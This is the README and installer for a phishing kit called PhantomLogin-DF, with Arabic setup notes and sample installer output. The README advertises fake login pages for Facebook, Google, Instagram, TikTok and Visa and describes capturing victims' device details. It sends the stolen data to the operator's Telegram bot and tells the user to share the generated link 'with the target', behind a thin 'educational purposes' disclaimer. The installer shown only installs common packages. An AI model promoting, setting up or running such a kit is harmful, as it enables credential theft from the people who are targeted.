##PhantomLogin-DF
##آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم

# PhantomLogin-DF

PhantomLogin-DF is a powerful tool designed for educational purposes to demonstrate the importance of cybersecurity. It simulates phishing pages to educate users about the risks of sharing sensitive information online.

---

## Features
- **Multiple Phishing Pages**: Supports Facebook, Instagram, Google, TikTok, Visa, and more.
- **Device Information Capture**: Collects device details like IP, battery level, network type, and more.
- **Telegram Integration**: Sends captured data directly to your Telegram bot.
- **Cross-Platform**: Works on Linux, macOS, Windows (WSL), Termux, and Kali Linux.

---

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/MohamedAbuAl-Saud/PhantomLogin-DF.git
   ```

2. Navigate to the project directory:
   ```bash
   cd PhantomLogin-DF
   ```

3. Run the installation script:
   ```bash
   chmod +x install.sh
   bash install.sh
   ```

4. Start the tool:
   ```bash
   bash phantomlogin.sh
   ```

---

## Usage

1. Enter your Telegram Bot Token and Chat ID when prompted.
2. Choose the phishing page you want to use.
3. Share the generated link with the target.
4. Captured data will be sent to your Telegram bot.

---

## Requirements

- **PHP**
- **SSH**
- **jq**
- **Git**
- **Curl**

---

## Contact Developer

For support, feedback, or inquiries, contact the developer on Telegram:  
[**@A_Y_TR**](https://t.me/A_Y_TR)

---

## Disclaimer

This tool is for educational purposes only. The developer is not responsible for any misuse of this tool. Use it responsibly and only on systems you own or have permission to test.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```

---

### ملف التثبيت (`install`):

```bash
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

show_banner() {
    echo -e "${BLUE}"
    echo "██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
    echo "██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
    echo "██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
    echo "██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
    echo "██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
    echo "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
    echo -e "${NC}"
    echo -e "${YELLOW}===================================================${NC}"
    echo -e "${GREEN}PhantomLogin-DF Installation Script${NC}"
    echo -e "${YELLOW}===================================================${NC}"
    echo -e "${BLUE}Developer: Mohamed Abu Al-Saud${NC}"
    echo -e "${YELLOW}===================================================${NC}"
}

install_packages() {
    echo -e "${GREEN}[+] Updating system and installing required packages...${NC}"
    if command -v apt-get &> /dev/null; then
        sudo apt-get update -y && sudo apt-get upgrade -y
        sudo apt-get install -y php ssh jq git curl
    elif command -v pkg &> /dev/null; then
        pkg update -y && pkg upgrade -y
        pkg install -y php openssh jq git curl
    elif command -v yum &> /dev/null; then
        sudo yum update -y
        sudo yum install -y php ssh jq git curl
    elif command -v brew &> /dev/null; then
        brew update
        brew install php ssh jq git curl
    else
        echo -e "${RED}[-] Unsupported package manager!${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Packages installed successfully!${NC}"
}

check_dependencies() {
    dependencies=("php" "ssh" "jq" "git" "curl")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[-] $dep is not installed!${NC}"
            exit 1
        else
            echo -e "${GREEN}[+] $dep is installed.${NC}"
        fi
    done
}

main() {
    show_banner
    install_packages
    check_dependencies
    echo -e "${GREEN}[+] Installation completed successfully!${NC}"
    echo -e "${YELLOW}===================================================${NC}"
    echo -e "${BLUE}Developed by: Mohamed Abu Al-Saud${NC}"
    echo -e "${YELLOW}===================================================${NC}"
}

main
```

---

### **كيفية الاستخدام:**
1. احفظ الملف `README.md` في مجلد المشروع.
2. احفظ ملف `install` في مجلد المشروع.
3. امنحه صلاحيات التنفيذ:
   ```bash
   chmod +x install.sh
   ```
4. اتبع التعليمات في `README.md` لتثبيت وتشغيل الأداة.

---

### **مثال للخرج:**
```
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
===================================================
PhantomLogin-DF Installation Script
===================================================
Developer: Mohamed Abu Al-Saud
===================================================
[+] Updating system and installing required packages...
[+] Packages installed successfully!
[+] php is installed.
[+] ssh is installed.
[+] jq is installed.
[+] git is installed.
[+] curl is installed.
[+] Installation completed successfully!
===================================================
Developed by: Mohamed Abu Al-Saud
===================================================
```

---
